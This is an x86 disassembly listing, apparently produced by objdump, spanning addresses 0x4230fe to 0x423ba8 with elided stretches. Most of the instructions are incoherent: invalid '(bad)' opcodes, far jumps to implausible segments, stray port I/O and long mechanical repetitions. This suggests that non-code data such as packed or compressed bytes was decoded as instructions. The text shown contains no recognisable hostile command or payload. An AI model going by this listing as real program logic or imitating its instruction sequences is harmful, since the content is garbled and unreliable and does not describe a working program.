  4230fe:	jae    0x42308c
  423100:	cwde   
  423101:	dec    esp
  423102:	aas    
  423103:	jmp    0xa041b145
  423108:	mov    gs,WORD PTR [eax]
  42310a:	arpl   WORD PTR [ecx-0x6f],si
  42310d:	sub    DWORD PTR [esi+0x50],ebp
  423110:	fild   WORD PTR [edi+0x64]
  423113:	inc    esp
  423114:	cmp    ah,BYTE PTR [ebp+0x3fc93afe]
  42311a:	dec    ebp
  42311b:	pop    ecx
  42311c:	rol    DWORD PTR [esi+0x41],0x3c
  423120:	int3   
  423121:	dec    edx
  423122:	arpl   WORD PTR [edi-0x32],cx
  423125:	sub    DWORD PTR [ecx+0x4c],esi
  423128:	int3   
  423129:	aam    0xfc
  42312b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42312c:	cmp    al,0x29
  42312e:	arpl   WORD PTR [esi],cx
  423130:	mov    ecx,0xc7346
	...
  42315d:	add    BYTE PTR [eax-0x36e393cb],al
  423163:	xchg   ebp,eax
  423164:	add    dl,dh
  423166:	cmp    al,0x1e
  423168:	arpl   WORD PTR [eax],ax
  42316a:	pop    ebx
  42316b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42316c:	outs   dx,DWORD PTR ds:[esi]
  42316d:	gs push ebp
  42316f:	sahf   
  423170:	pop    ebp
  423171:	ins    DWORD PTR es:[edi],dx
  423172:	cmp    bl,BYTE PTR [eax-0x4c90004]
  423178:	jb     0x4231db
  42317a:	pop    ss
  42317b:	add    DWORD PTR [eax],esi
  42317d:	xor    al,BYTE PTR [ecx-0x5]
  423180:	push   0xd558176c
  423185:	add    ah,ah
  423187:	jmp    DWORD PTR [ecx+0x6c]
  42318a:	repz adc al,0x75
  42318d:	gs add al,0x5
  423190:	jno    0x4231f7
  423192:	(bad)  
  423193:	push   edi
  423194:	outs   dx,DWORD PTR ds:[esi]
  423195:	push   0x3368fbfa
  42319a:	adc    eax,0xc36c60be
  42319f:	push   edi
  4231a0:	jne    0x4231a2
  4231a2:	sahf   
  4231a3:	std    
  4231a4:	jo     0x42320b
  4231a6:	vpunpcklwd ymm6,ymm0,YMMWORD PTR [esp+eiz*4+0x9]
  4231ac:	pop    esi
  4231ad:	arpl   WORD PTR [esp+eiz*4+0x57966c6e],bp
  4231b4:	ja     0x4231b6
  4231b6:	sahf   
  4231b7:	std    
  4231b8:	jo     0x42321f
  4231ba:	adc    eax,0x647461f9
  4231bf:	or     eax,0x6162
	...
  4231ec:	or     eax,DWORD PTR [edx]
  4231ee:	push   edx
  4231ef:	jb     0x423254
  4231f1:	sahf   
  4231f2:	cld    
  4231f3:	call   FWORD PTR [eax-0xa]
  4231f6:	push   0x69
  4231f8:	add    DWORD PTR [edx],eax
  4231fa:	jno    0x42322a
  4231fc:	sti    
  4231fd:	cli    
  4231fe:	push   0x4f5e6200
  423203:	je     0x42325a
  423205:	lods   al,BYTE PTR ds:[esi]
  423206:	jo     0x42327a
  423208:	cs sahf 
  42320a:	cld    
  42320b:	(bad)  
  42320c:	ds ret 0x5103
  423210:	jmp    0xbbcf:0xe640d66f
  423217:	ds ds scas al,BYTE PTR es:[edi]
  42321a:	add    edx,DWORD PTR [ecx-0x2e]
  42321d:	iret   
  42321e:	aam    0x6c
  423220:	not    ebx
  423222:	mov    ah,0x3e
  423224:	ds enter 0x5103,0xaa
  423229:	mov    dh,0xd5
  42322b:	jae    0x4231d9
  42322d:	add    eax,DWORD PTR [ecx]
  42322f:	jmp    0xa77d:0x71b5153e
  423236:	mov    al,0x4d
  423238:	xchg   DWORD PTR [ebx],eax
  42323a:	add    DWORD PTR [esi],ecx
  42323c:	aas    
  42323d:	cmc    
  42323e:	mov    ah,0x71
  423240:	ins    DWORD PTR es:[edi],dx
  423241:	or     BYTE PTR [ebx+0xc49146],dh
  423247:	jno    0x4232af
  423249:	loopne 0x423204
  42324b:	pop    esi
  42324c:	outs   dx,BYTE PTR ds:[esi]
  42324d:	fcmovnu st,st(6)
  42324f:	arpl   WORD PTR [eax],ax
	...
  423279:	add    BYTE PTR [edx+0x50],dl
  42327c:	add    DWORD PTR [esi],esi
  42327e:	ds jmp 0x42321f
  423281:	bound  ecx,QWORD PTR [edx-0xf]
  423284:	mov    ds:0x1566263,eax
  423289:	sub    bh,BYTE PTR [esi]
  42328b:	fldenv [edi-0x4ad6d98d]
  423291:	jae    0x4232af
  423293:	cmp    esp,DWORD PTR [edx+0x41f1b5e]
  423299:	inc    edi
  42329a:	ds xor eax,0x1f2560a1
  4232a0:	mov    eax,0x45991ff
  4232a5:	popa   
  4232a6:	sbb    DWORD PTR [edx],ebx
  4232a8:	mov    ds:0x4881d62,al
  4232ad:	es ds pop ebx
  4232b0:	or     ah,BYTE PTR [eax-0x48fbb21e]
  4232b6:	fidivr DWORD PTR ds:0x5aeda902
  4232bc:	and    eax,DWORD PTR [edi+ecx*8]
  4232bf:	aaa    
  4232c0:	adc    eax,0x29d251a8
  4232c5:	add    al,0xcf
  4232c7:	aaa    
  4232c8:	add    ebp,DWORD PTR [ecx+0x3e746de]
  4232ce:	js     0x42332b
  4232d0:	fldcw  WORD PTR [eax+0x3e7499e]
  4232d6:	sbb    DWORD PTR [ebx-0x26],0xffffffa8
  4232da:	lods   eax,DWORD PTR ds:[esi]
  4232db:	dec    esi
  4232dc:	mov    esi,0xa6
	...
  423305:	add    BYTE PTR [eax],al
  423307:	add    BYTE PTR [esi+0x11b7b742],ah
  42330d:	rol    BYTE PTR [edi],cl
  42330f:	add    al,0x73
  423311:	cs test al,0xd6
  423314:	lea    edi,[ecx+edi*4]
  423317:	mov    bh,0x6c
  423319:	dec    ebx
  42331a:	out    0x3,eax
  42331c:	imul   ecx,DWORD PTR [esi-0x72],0xffffffa6
  423320:	push   esi
  423321:	mov    ds,ecx
  423323:	loope  0x423382
  423325:	aas    
  423326:	jnp    0x42332b
  423328:	test   DWORD PTR [ebx-0x4d],ebx
  42332b:	mov    ds:0xb6943770,al
  423330:	pop    esp
  423331:	dec    ebp
  423332:	xchg   edi,eax
  423333:	mov    ch,0x52
  423335:	cmp    DWORD PTR [eax-0x18e3e361],eax
  42333b:	add    edx,DWORD PTR [ecx]
  42333d:	pop    ebx
  42333e:	xor    al,0xa2
  423340:	adc    eax,0xca84842
  423345:	dec    esi
  423346:	inc    esp
  423347:	mov    dh,0x9
  423349:	dec    ebp
  42334a:	push   esi
  42334b:	stos   BYTE PTR es:[edi],al
  42334c:	sbb    BYTE PTR [edi],bh
  42334e:	inc    esp
  42334f:	add    al,0xd
  423351:	dec    esi
  423352:	add    BYTE PTR [eax+ecx*8+0x3c],cl
  423356:	outs   dx,BYTE PTR ds:[esi]
  423357:	aaa    
  423358:	pop    esp
  423359:	cmp    eax,0x5b3a156c
  42335e:	add    cl,ch
  423360:	cmp    eax,0x3de9005b
  423365:	pop    ebx
  423366:	add    cl,ch
  423368:	cmp    eax,0xe9005b
	...
  423395:	add    BYTE PTR ds:0x3de9005b,bh
  42339b:	pop    ebx
  42339c:	add    cl,ch
  42339e:	cmp    eax,0x3de9005b
  4233a3:	pop    ebx
  4233a4:	add    cl,ch
  4233a6:	cmp    eax,0x3de9005b
  4233ab:	pop    ebx
  4233ac:	add    cl,ch
  4233ae:	cmp    eax,0x3de9005b
  4233b3:	pop    ebx
  4233b4:	add    cl,ch
  4233b6:	cmp    eax,0x3de9005b
  4233bb:	pop    ebx
  4233bc:	add    cl,ch
  4233be:	cmp    eax,0x3de9005b
  4233c3:	pop    ebx
  4233c4:	add    cl,ch
  4233c6:	cmp    eax,0x3de9005b
  4233cb:	pop    ebx
  4233cc:	add    cl,ch
  4233ce:	cmp    eax,0x3de9005b
  4233d3:	pop    ebx
  4233d4:	add    cl,ch
  4233d6:	cmp    eax,0x3de9005b
  4233db:	pop    ebx
  4233dc:	add    cl,ch
  4233de:	cmp    eax,0x3de9005b
  4233e3:	pop    ebx
  4233e4:	add    cl,ch
  4233e6:	cmp    eax,0x3de9005b
  4233eb:	pop    ebx
  4233ec:	add    cl,ch
  4233ee:	cmp    eax,0x3de9005b
  4233f3:	pop    ebx
  4233f4:	add    BYTE PTR [eax],al
  4233f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233f7:	pop    esp
	...
  423424:	xchg   edi,eax
  423425:	pop    esp
  423426:	add    BYTE PTR [eax],al
  423428:	xchg   edi,eax
  423429:	pop    esp
  42342a:	add    BYTE PTR [eax],al
  42342c:	addr16 pop esp
  42342e:	add    BYTE PTR [eax],al
  423430:	addr16 pop esp
  423432:	add    BYTE PTR [eax],al
  423434:	push   edi
  423435:	pop    esp
  423436:	add    BYTE PTR [eax],al
  423438:	push   edi
  423439:	pop    esp
  42343a:	add    BYTE PTR [eax],al
  42343c:	addr16 pop esp
  42343e:	add    BYTE PTR [eax],al
  423440:	addr16 pop esp
  423442:	add    BYTE PTR [eax],al
  423444:	push   edi
  423445:	pop    esp
  423446:	add    BYTE PTR [eax],al
  423448:	push   edi
  423449:	pop    esp
  42344a:	add    BYTE PTR [eax],al
  42344c:	daa    
  42344d:	pop    esp
  42344e:	add    BYTE PTR [eax],al
  423450:	daa    
  423451:	pop    esp
  423452:	add    BYTE PTR [eax],al
  423454:	pop    ss
  423455:	pop    esp
  423456:	add    BYTE PTR [eax],al
  423458:	pop    ss
  423459:	pop    esp
  42345a:	add    BYTE PTR [eax],al
  42345c:	daa    
  42345d:	pop    esp
  42345e:	add    BYTE PTR [eax],al
  423460:	daa    
  423461:	pop    esp
  423462:	add    BYTE PTR [eax],al
  423464:	pop    ss
  423465:	pop    esp
  423466:	add    BYTE PTR [eax],al
  423468:	pop    ss
  423469:	pop    esp
  42346a:	add    BYTE PTR [eax],al
  42346c:	out    0x5b,eax
  42346e:	add    BYTE PTR [eax],al
  423470:	out    0x5b,eax
  423472:	add    BYTE PTR [eax],al
  423474:	xlat   BYTE PTR ds:[ebx]
  423475:	pop    ebx
  423476:	add    BYTE PTR [eax],al
  423478:	mov    esp,esp
  42347a:	jmp    0x4234cd
  42347c:	lds    edx,FWORD PTR ds:0xe3468a08
  423482:	dec    edx
  423483:	push   DWORD PTR [ebp+0xc35ab5]
	...
  4234b1:	add    BYTE PTR [ebx-0x1c],ch
  4234b4:	jmp    0x423507
  4234b6:	adc    BYTE PTR [eax],ch
  4234b8:	xor    ecx,ecx
  4234ba:	sbb    ah,ah
  4234bc:	outs   dx,BYTE PTR ds:[esi]
  4234bd:	xor    BYTE PTR [ebp+0x288b0c48],dh
  4234c3:	outs   dx,DWORD PTR ds:[esi]
  4234c4:	mov    DWORD PTR [esi+0x46],eax
  4234c7:	loop   0x42350b
  4234c9:	cld    
  4234ca:	lds    edx,FWORD PTR [eax+0x20]
  4234cd:	mov    edx,DWORD PTR [eax-0x25]
  4234d0:	cmp    al,0x6b
  4234d2:	or     bl,BYTE PTR [eax-0x80]
  4234d5:	aas    
  4234d6:	add    eax,0x67eb0247
  4234db:	das    
  4234dc:	pop    esi
  4234dd:	mov    esp,DWORD PTR [ebx+0x2d]
  4234e0:	ror    esp,0xb
  4234e3:	in     al,0xeb
  4234e5:	sub    DWORD PTR [edx+0x76],0xffffff89
  4234e9:	inc    ebp
  4234ea:	inc    esi
  4234eb:	loop   0x42352f
  4234ed:	loopne 0x4234a4
  4234ef:	sbb    eax,0xbaeb8be0
  4234f4:	add    BYTE PTR [ecx+0x7a],dl
  4234f7:	in     al,0x52
  4234f9:	in     al,0xc5
  4234fb:	sbb    ah,ah
  4234fd:	mov    esi,DWORD PTR [esi+0x53]
  423500:	add    DWORD PTR [ebp+0x36],ecx
  423503:	in     al,0x4a
  423505:	clc    
  423506:	lds    ebp,FWORD PTR [eax]
  423508:	clc    
  423509:	mov    edi,DWORD PTR [edi+esi*2+0x1]
  42350d:	inc    ebp
  42350e:	ss in  al,0x42
  423511:	call   0x8c3a55cb
	...
  42353e:	add    BYTE PTR [eax],al
  423540:	(bad)  
  423541:	jnp    0x423544
  423543:	push   ebp
  423544:	inc    esi
  423545:	in     al,0x52
  423547:	lock mov ch,0x18
  42354a:	clc    
  42354b:	mov    esi,DWORD PTR [esi+0x6f]
  42354e:	add    DWORD PTR [ebp+0x46],ecx
  423551:	in     al,0x4a
  423553:	cld    
  423554:	stc    
  423555:	sbb    ah,dh
  423557:	add    BYTE PTR [esi],bh
  423559:	pop    ebx
  42355a:	add    bl,ch
  42355c:	aaa    
  42355d:	loop   0x4235b1
  42355f:	hlt    
  423560:	mov    ebp,0xb88fe99
  423565:	(bad)  
  423566:	mov    BYTE PTR [ebp-0x5a],al
  423569:	loop   0x4235b5
  42356b:	hlt    
  42356c:	and    ebx,DWORD PTR gs:[eax]
  42356f:	jae    0x423577
  423571:	loop   0x4235c5
  423573:	lock lds ebx,FWORD PTR [ecx+0x1]
  423577:	inc    ebp
  423578:	ss in  al,0x42
  42357b:	fcom   QWORD PTR [ebx*2+0x1b3cac68]
  423582:	add    BYTE PTR [ebx-0x17b150fd],cl
  423588:	push   cs
  423589:	pop    esp
  42358a:	add    BYTE PTR [eax],al
  42358c:	mov    ebp,0x7e850b97
  423591:	dec    eax
  423592:	sbb    DWORD PTR [ebx+0x4588c6eb],ecx
  423598:	push   esi
  423599:	pop    esi
  42359a:	mov    ch,0xc
  42359c:	out    dx,al
  42359d:	jecxz  0x4235e9
  42359f:	in     al,dx
  4235a0:	lds    esp,FWORD PTR [edi]
  4235a2:	in     al,dx
  4235a3:	mov    eax,DWORD PTR [eax]
	...
  4235cd:	add    BYTE PTR [ebx-0x31],bh
  4235d0:	mov    BYTE PTR [esi+ecx*8],al
  4235d3:	pop    ecx
  4235d4:	inc    ebx
  4235d5:	or     BYTE PTR ds:0xe4d8960,dl
  4235db:	fidivr DWORD PTR [esi-0xfe038fc]
  4235e1:	jmp    0x4235c5
  4235e3:	mov    eax,eax
  4235e5:	mov    ebx,DWORD PTR [ebx]
  4235e7:	xor    cl,al
  4235e9:	int3   
  4235ea:	or     bl,BYTE PTR [edi-0x60fd3335]
  4235f0:	retf   
  4235f1:	int3   
  4235f2:	cli    
  4235f3:	sahf   
  4235f4:	retf   
  4235f5:	int3   
  4235f6:	mov    esp,edx
  4235f8:	jmp    0x42357d
  4235fa:	jmp    0xfccd:0xd105e872
  423601:	mov    DWORD PTR [ebx-0x29ba773d],eax
  423607:	sub    ch,al
  423609:	sub    DWORD PTR [ecx+0x7a83fccd],edi
  42360f:	push   esi
  423610:	mov    eax,ds:0x1c31f4
  423615:	push   0x4058e2
  42361a:	lds    ebx,FWORD PTR [edi]
  42361c:	call   0xf4a9c772
  423621:	ja     0x423622
  423623:	pop    edx
  423624:	mov    eax,ds:0x1c09f8
  423629:	push   0x3e
  42362b:	inc    ecx
  42362c:	add    BYTE PTR [eax-0x7e],ch
  42362f:	pop    eax
  423630:	inc    eax
	...
  423659:	add    BYTE PTR [eax],al
  42365b:	add    BYTE PTR [ecx+0x67],ch
  42365e:	clc    
  42365f:	ja     0x423660
  423661:	pop    edx
  423662:	xchg   DWORD PTR [ebp+0x66],eax
  423665:	xchg   ebp,eax
  423666:	inc    edx
  423667:	cld    
  423668:	ds pop ebx
  42366a:	add    BYTE PTR [eax],al
  42366c:	push   ebp
  42366d:	arpl   WORD PTR [ecx-0x3e26bdab],cx
  423673:	add    edi,eax
  423675:	es cld 
  423677:	xor    DWORD PTR [ebx+0x5f7307cf],0xffffffe0
  42367e:	inc    edx
  42367f:	cld    
  423680:	mov    ch,0x5f
  423682:	or     DWORD PTR [esp+edi*1-0x3aaeffe5],0x26
  42368a:	call   0xf4a93fe1
  42368f:	ja     0x423710
  423691:	pop    ebx
  423692:	mov    DWORD PTR [ebp-0x6],ecx
  423695:	loop   0x42369a
  423697:	(bad)  
  423698:	jmp    0x88ab:0xd5003f44
  42369f:	in     eax,0x83
  4236a1:	cwde   
  4236a2:	retf   
  4236a3:	int3   
  4236a4:	or     ah,BYTE PTR [eax-0x5ffd3335]
  4236aa:	retf   
  4236ab:	int3   
  4236ac:	cli    
  4236ad:	lahf   
  4236ae:	retf   
  4236af:	int3   
  4236b0:	imul   esp,eax,0xffffffeb
  4236b3:	mov    eax,ds:0x3f530e
  4236b8:	jo     0x42369a
  4236ba:	aas    
  4236bb:	xor    BYTE PTR [ebp+0x3e081e],dh
	...
  4236e9:	add    BYTE PTR [edi+0x7d5d0823],dh
  4236ef:	lahf   
  4236f0:	retf   
  4236f1:	int3   
  4236f2:	sbb    BYTE PTR [edi-0x60853335],0xcb
  4236f9:	int3   
  4236fa:	jmp    0x4236db
  4236fc:	jmp    0x423689
  4236fe:	add    ebx,DWORD PTR [edi+0x50]
  423701:	mov    eax,DWORD PTR [ebx]
  423703:	arpl   WORD PTR [edi-0x1],cx
  423706:	push   ebx
  423707:	(bad)  
  423708:	je     0x42374b
  42370a:	ds cs ror esp,0x8a
  42370f:	lahf   
  423710:	retf   
  423711:	int3   
  423712:	sbb    BYTE PTR [edi-0x60853335],0xcb
  423719:	int3   
  42371a:	jmp    0x4236fb
  42371c:	jmp    0x4236a1
  42371e:	sub    ah,BYTE PTR [ebx+0x6a]
  423721:	add    BYTE PTR [ebx+ebx*2+0x1b3cdc68],ah
  423728:	add    bh,bh
  42372a:	dec    ebx
  42372b:	shl    DWORD PTR [ecx+eax*2+0x3e],cl
  42372f:	loop   0x423773
  423731:	clc    
  423732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423733:	ret    
  423734:	add    DWORD PTR [eax+0x3e],eax
  423737:	loopne 0x42377b
  423739:	clc    
  42373a:	outs   dx,BYTE PTR ds:[esi]
  42373b:	ret    
  42373c:	mov    ecx,0x80cbf9ff
  423741:	les    eax,FWORD PTR [esi-0x1e]
  423744:	inc    edx
  423745:	cld    
  423746:	mov    ch,0x1d
  423748:	adc    BYTE PTR [ecx-0x4b],dl
  42374b:	and    eax,0x520c
	...
  423778:	lds    edx,FWORD PTR ds:0x25d15008
  42377e:	cld    
  42377f:	mov    esp,ebx
  423781:	sub    eax,0xe06bccc1
  423786:	jmp    0x4237d9
  423788:	adc    DWORD PTR ds:0x5b3e00fc,0xe037eb00
  423792:	inc    edx
  423793:	cld    
  423794:	mov    ebp,0x388fe9a
  423799:	iret   
  42379a:	mov    BYTE PTR [ebp-0x6e],cl
  42379d:	(bad)  
  42379e:	dec    ebx
  42379f:	adc    BYTE PTR ds:0x3655896c,cl
  4237a5:	pop    eax
  4237a6:	push   ebx
  4237a7:	cld    
  4237a8:	dec    ecx
  4237a9:	add    eax,0x5f038b02
  4237ae:	add    DWORD PTR [ebp+0x6a],ecx
  4237b1:	pop    ebx
  4237b2:	mov    dh,0x11
  4237b4:	and    eax,0x96077399
  4237b9:	pop    ecx
  4237ba:	add    BYTE PTR [eax],al
  4237bc:	rol    BYTE PTR ds:[ebx],0xeb
  4237c0:	outs   dx,BYTE PTR ds:[esi]
  4237c1:	xchg   eax,eax
  4237c3:	mov    ebx,DWORD PTR [ebx+0x2d]
  4237c6:	ror    esp,0xa
  4237c9:	cwde   
  4237ca:	retf   
  4237cb:	int3   
  4237cc:	add    bl,BYTE PTR [eax-0x68053335]
  4237d2:	retf   
  4237d3:	int3   
  4237d4:	mov    edx,esi
  4237d6:	jmp    0x423791
  4237d8:	ss pop ebx
	...
  423806:	call   0x782b:0x3b8906d6
  42380d:	inc    ecx
  42380e:	ds sub cl,al
  423811:	int3   
  423812:	or     bl,BYTE PTR [eax-0x67fd3335]
  423818:	retf   
  423819:	int3   
  42381a:	cli    
  42381b:	xchg   edi,eax
  42381c:	retf   
  42381d:	int3   
  42381e:	mov    edx,esi
  423820:	jmp    0x4237a5
  423822:	jmp    0x77de:0x4645896b
  423829:	add    al,0x3e
  42382b:	pop    edx
  42382c:	test   BYTE PTR [eax-0x74ffa4c2],cl
  423832:	or     edx,DWORD PTR [ebx-0x77]
  423835:	push   ecx
  423836:	cmp    bl,dh
  423838:	jmp    0x86f7c745
  42383d:	push   ebp
  42383e:	stos   BYTE PTR es:[edi],al
  42383f:	(bad)  
  423840:	inc    edx
  423841:	or     BYTE PTR [ebp-0x476f865],bh
  423847:	retf   0x45c4
  42384a:	mov    bl,BYTE PTR [ebx+0x0]
  42384d:	add    BYTE PTR [esi],bh
  42384f:	mov    dh,0x6
  423851:	mov    ecx,DWORD PTR [ebx]
  423853:	mov    DWORD PTR [eax+0x4ad43fc1],0xfc30b5fc
  42385d:	cmp    ecx,DWORD PTR [ebx]
  42385f:	iret   
  423860:	jo     0x4238a8
  423862:	lds    esp,FWORD PTR [eax]
  423864:	cld    
  423865:	mov    eax,DWORD PTR [ebx]
  423867:	retf   
  423868:	or     al,0xb7
	...
  423892:	add    BYTE PTR [eax],al
  423894:	xor    bl,BYTE PTR [edi+edi*4]
  423897:	cli    
  423898:	xor    bl,dh
  42389a:	stc    
  42389b:	add    esi,DWORD PTR [ebx+0x3245898d]
  4238a1:	(bad)  
  4238a2:	dec    edx
  4238a3:	lock cmp DWORD PTR [edx],edx
  4238a6:	adc    al,0x41
  4238a8:	mov    edi,0x3e0ffcbc
  4238ad:	pop    ebx
  4238ae:	xchg   DWORD PTR [ebp+0x16],edx
  4238b1:	(bad)  
  4238b2:	inc    edx
  4238b3:	or     BYTE PTR [ebp+0x36030c17],dh
  4238b9:	(bad)  
  4238ba:	push   edx
  4238bb:	clc    
  4238bc:	lds    ebx,FWORD PTR [esi+0xf]
  4238bf:	add    edi,DWORD PTR [ebx+0x6b]
  4238c2:	mov    DWORD PTR [ebp+0x36],ecx
  4238c5:	(bad)  
  4238c6:	push   edx
  4238c7:	or     al,0x3d
  4238c9:	ins    BYTE PTR es:[edi],dx
  4238ca:	mov    DWORD PTR [ebp-0x2a],ecx
  4238cd:	rol    DWORD PTR [ebx],cl
  4238cf:	or     ah,ch
  4238d1:	xrelease mov BYTE PTR [ebp+0x36],dl
  4238d5:	(bad)  
  4238d6:	inc    edx
  4238d7:	or     BYTE PTR ds:0x389041d,bh
  4238dd:	push   ebx
  4238de:	out    0x6b,eax
  4238e0:	mov    cl,0xc9
  4238e2:	cld    
  4238e3:	mov    esp,DWORD PTR [ebx+0xbccc127]
  4238e9:	(bad)  
  4238ea:	jmp    0x42386f
  4238ec:	stos   BYTE PTR es:[edi],al
  4238ed:	jle    0x423878
  4238ef:	inc    ebp
  4238f0:	inc    esi
  4238f1:	aam    0x42
  4238f3:	in     al,0xb5
  4238f5:	pop    ss
  4238f6:	in     al,0x8b
	...
  423920:	add    BYTE PTR [eax],al
  423922:	jmp    0x4238e2
  423924:	add    BYTE PTR [ecx+0x3a],dl
  423927:	aam    0x52
  423929:	call   0x8c2a58f3
  42392e:	mov    dh,0xda
  423930:	(bad)  
  423931:	(bad)  
  423932:	ds aam 0x4a
  423935:	lock mov ebp,0x4100f047
  42393b:	(bad)  
  42393d:	add    BYTE PTR [esi],bh
  42393f:	pop    ebx
  423940:	mov    DWORD PTR [ebp+0x36],edx
  423943:	pop    esi
  423944:	push   ebx
  423945:	lock (bad) 
  423947:	cs loopne 0x4238d5
  42394a:	jnp    0x423907
  42394c:	cmp    BYTE PTR [eax+0x4e],0x5b
  423950:	or     eax,0x5c1b84
  423955:	add    BYTE PTR [ebx+ebx*2+0x16c5006a],ah
  42395c:	loopne 0x4238e9
  42395e:	jae    0x4239b3
  423960:	add    DWORD PTR [ecx+0x32],edx
  423963:	sub    eax,0x50f615fd
  423968:	aas    
  423969:	add    bh,al
  42396b:	push   ds
  42396c:	cld    
  42396d:	mov    eax,DWORD PTR [ebx+0x3e3880bb]
  423973:	dec    edi
  423974:	pop    ss
  423975:	mov    ecx,DWORD PTR [ebx+0x465588bb]
  42397b:	pop    esp
  42397c:	jns    0x45caf0f5
  423982:	(bad)  
  423984:	dec    edx
  423985:	or     BYTE PTR [eax],al
	...
  4239af:	add    BYTE PTR ds:0x3891013,bh
  4239b5:	iret   
  4239b6:	call   0xe070eed2
  4239bb:	mov    edi,ebx
  4239bd:	push   edx
  4239be:	add    DWORD PTR [edx+0x2e],eax
  4239c1:	rol    BYTE PTR [edx-0xc],cl
  4239c4:	lds    edx,FWORD PTR [esi]
  4239c6:	loopne 0x423953
  4239c8:	repz push edx
  4239ca:	add    DWORD PTR [ecx],edx
  4239cc:	mov    bh,0x2e
  4239ce:	in     al,dx
  4239cf:	mov    DWORD PTR [ebx],0x3effffc3
  4239d5:	pop    ebx
  4239d6:	mov    DWORD PTR [ebp+0x5e],eax
  4239d9:	fdiv   QWORD PTR [edi+0x10]
  4239dc:	ds dec edi
  4239de:	or     eax,0x80bb0b8b
  4239e3:	cmp    DWORD PTR [esi],edi
  4239e5:	dec    edi
  4239e6:	add    eax,0xfec303c7
  4239eb:	(bad)  
  4239ec:	ds pop ebx
  4239ee:	mov    DWORD PTR [ebp+0x32],edx
  4239f1:	fdivr  QWORD PTR [ecx]
  4239f3:	add    BYTE PTR [edx+0x3245893a],ch
  4239f9:	aam    0x7
  4239fb:	sbb    DWORD PTR [edi],0xbe00005b
  423a01:	dec    esi
  423a02:	sbb    al,0x8b
  423a04:	imul   ecx,edi,0xffffff88
  423a07:	add    ah,BYTE PTR [ebx-0x38]
  423a0a:	cld    
  423a0b:	inc    DWORD PTR [ecx-0x5b276d5]
  423a11:	sub    eax,ebp
  423a13:	mov    ch,0x0
	...
  423a3d:	add    bl,dh
  423a3f:	(bad)  
  423a40:	cld    
  423a41:	add    DWORD PTR [edx],0x53
  423a44:	xchg   DWORD PTR [ebp+0x2],eax
  423a47:	mov    ah,0x1b
  423a49:	mov    esi,DWORD PTR [ebx-0x31]
  423a4c:	mov    BYTE PTR [edx],al
  423a4e:	lds    edx,FWORD PTR ds:0x53728d08
  423a54:	add    dl,BYTE PTR [edx-0x4b]
  423a57:	sbb    eax,0xefa650fc
  423a5c:	cli    
  423a5d:	push   DWORD PTR [ecx-0x48f73c25]
  423a63:	sbb    eax,0xcef38bdc
  423a68:	mov    BYTE PTR [ebp+0x7a],dl
  423a6b:	ror    DWORD PTR [esi],1
  423a6d:	mov    edi,ebx
  423a6f:	into   
  423a70:	add    al,0x42
  423a73:	rol    BYTE PTR [edx-0xc],cl
  423a76:	mov    ch,0x15
  423a78:	in     al,dx
  423a79:	cmp    DWORD PTR [edi+0x5e],0xffffff87
  423a7d:	dec    ebp
  423a7e:	bound  esi,QWORD PTR [ebx-0x44ec746c]
  423a84:	add    dl,0x4a
  423a87:	rcl    BYTE PTR [edx-0x20],cl
  423a8a:	addr16 pop eax
  423a8c:	std    
  423a8d:	call   DWORD PTR [ecx-0x2d]
  423a90:	loop   0x423aef
  423a92:	jge    0x423a2a
  423a94:	retf   
  423a95:	int3   
  423a96:	jmp    0x423a6b
  423a98:	jmp    0x423a1d
  423a9a:	sub    dl,BYTE PTR [eax+ebp*2-0x10]
  423a9e:	cmp    al,0x1b
  423aa0:	add    bh,bh
	...
  423aca:	add    BYTE PTR [eax],al
  423acc:	push   ebx
  423acd:	pop    ebx
  423ace:	js     0x423b11
  423ad0:	ds aam 0x42
  423ad3:	clc    
  423ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ad5:	mov    DWORD PTR [ecx],0x42d23e40
  423adb:	clc    
  423adc:	outs   dx,BYTE PTR ds:[esi]
  423add:	mov    bl,0x3d
  423adf:	std    
  423ae0:	add    edi,eax
  423ae2:	add    ah,0x46
  423ae5:	aam    0x42
  423ae7:	cld    
  423ae8:	lds    ebx,FWORD PTR [eax]
  423aea:	adc    BYTE PTR [ecx-0x4b],dl
  423aed:	xor    BYTE PTR [edx+edx*2],cl
  423af0:	mov    ch,0x20
  423af2:	or     BYTE PTR [eax-0x27],dl
  423af5:	xor    ah,bh
  423af7:	mov    ebx,ebx
  423af9:	sub    cl,al
  423afb:	int3   
  423afc:	cli    
  423afd:	xchg   edi,eax
  423afe:	retf   
  423aff:	int3   
  423b00:	imul   edx,edx,0xffffffeb
  423b03:	mov    eax,ds:0x3f431a
  423b08:	js     0x423b65
  423b0a:	push   0x782f538b
  423b0f:	inc    ecx
  423b10:	ds aam 0x4f
  423b13:	add    esp,ecx
  423b15:	call   0xccc1:0x283b5087
  423b1c:	jp     0x423ab5
  423b1e:	retf   
  423b1f:	int3   
  423b20:	jmp    0x423af3
  423b22:	jmp    0x423aa7
  423b24:	push   0x57
  423b26:	lahf   
  423b27:	push   eax
  423b28:	neg    BYTE PTR [ebx]
  423b2a:	add    BYTE PTR [ebx+0x3ec78a8c],cl
	...
  423b58:	add    BYTE PTR [eax],al
  423b5a:	mov    ch,0x1b
  423b5c:	xor    BYTE PTR [ebx+0x3ed1d26c],cl
  423b62:	lds    edx,FWORD PTR [ebx]
  423b64:	or     al,0x8b
  423b66:	ins    BYTE PTR es:[edi],dx
  423b67:	aam    0x4a
  423b69:	hlt    
  423b6a:	mov    ch,0x20
  423b6c:	hlt    
  423b6d:	mov    eax,DWORD PTR [esi+0x364d8757]
  423b73:	rcl    BYTE PTR [edx-0x8],cl
  423b76:	mov    bh,0x2f
  423b78:	cld    
  423b79:	mov    eax,0x5b3f
  423b7e:	ret    
  423b7f:	call   0xf8:0x47bd4473
  423b86:	xchg   ebx,eax
  423b87:	pop    edi
  423b88:	xor    eax,eax
  423b8a:	adc    eax,0xf64d8987
  423b8f:	ror    DWORD PTR [esi+0x18],1
  423b92:	xor    eax,0x47750830
  423b97:	rol    BYTE PTR [edx-0x8],cl
  423b9a:	mov    ch,0x17
  423b9c:	or     al,0x89
  423b9e:	xchg   BYTE PTR [edi-0x77],ah
  423ba1:	push   ebp
  423ba2:	(bad)  
  423ba3:	rol    DWORD PTR [edx+0x10],1
  423ba6:	mov    bh,0x18
  423ba8:	sbb    BYTE PTR [eax+0x5b3f],bh
